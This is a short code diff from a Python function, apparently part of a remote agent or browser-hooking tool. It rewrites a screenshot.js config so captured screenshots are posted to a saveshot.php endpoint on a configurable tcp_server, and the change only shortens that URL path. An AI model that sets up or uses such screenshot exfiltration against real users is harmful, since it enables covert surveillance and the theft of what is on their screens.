@@ -148,7 +148,7 @@ def agent_module():
         # code for screenshot dynamically generated
         with open('config/screenshot.js') as screenshot_conf:
             screenshot_code = screenshot_conf.readlines()
-            screenshot_code[5] = "var postDest = 'http://" + tcp_server + "/config/php_conf/saveshot.php?png=';\n"
+            screenshot_code[5] = "var postDest = 'http://" + tcp_server + "/saveshot.php?png=';\n"
 
         with open('config/screenshot.js', "w") as screenshot_conf:
             screenshot_conf.writelines(screenshot_code)
